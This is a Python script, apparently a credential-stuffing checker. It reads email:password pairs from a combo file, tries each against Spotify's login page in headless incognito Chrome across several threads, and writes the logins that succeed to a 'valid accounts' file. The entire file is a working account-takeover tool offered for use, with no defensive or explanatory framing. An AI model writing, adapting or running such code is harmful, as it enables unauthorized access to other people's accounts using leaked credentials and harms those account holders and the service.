import threading, time

import selenium.webdriver as webdriver
from selenium.webdriver.common.by import By

from colorama import Fore, Back
import colorama

# <==== Configs ====>

MAX_THREADS = 5
CURRENT_THREADS = 0

COMBO_PATH = 'accounts.txt'

colorama.init(autoreset=True)

options = webdriver.ChromeOptions()

options.add_argument("--headless")
options.add_argument("--disable-gpu")
options.add_argument("--incognito")
options.add_argument('--disable-extensions')
options.add_argument('--log-level=OFF')

url = 'https://accounts.spotify.com/pt-BR/login'  # 'pt-BR' = brazilian link ⚽

# <==== Configs ====>

with open(COMBO_PATH, 'r') as file:
    accounts = file.read().split('\n')
    for i in accounts:
        if i == "":
            accounts.remove(i)


def check_account(account):
    global CURRENT_THREADS
    
    CURRENT_THREADS += 1
    
    browser = webdriver.Chrome(options=options)
    browser.get(url)
    browser.implicitly_wait(30)

    email, password = account.split(':')

    # login process
    browser.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
    browser.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
    browser.find_element(By.CSS_SELECTOR, '#login-button').click()
    # login process

    time.sleep(1.7)

    # valid
    if browser.current_url == "https://accounts.spotify.com/pt-BR/status":
        print(f"{Fore.BLACK}{Back.GREEN}[VALID]{Back.RESET}{Fore.RESET} {email}:{password}")

        with open('valid accounts.txt', 'a') as file:
            file.write(f"{email}:{password}\n")
        
        CURRENT_THREADS -= 1
        
        browser.close()
        return
    
    # invalid
    print(f"{Fore.BLACK}{Back.RED}[INVALID]{Back.RESET}{Fore.RESET} {email}:{password}")

    time.sleep(0.5)
    CURRENT_THREADS -= 1
    browser.close()


print(f"Initializing with {MAX_THREADS} threads...\n")

for acc in accounts:
    while True:
        if CURRENT_THREADS == 5:
            time.sleep(0.5)
            continue
        break
        
    threading.Thread(target=check_account, args=(acc,)).start()
    time.sleep(0.5)

while True:
    if CURRENT_THREADS == 0:
        print(f"\nYour valid accounts were saved in valid accounts.txt\n")
        break
    time.sleep(1)

input("Press enter to exit")
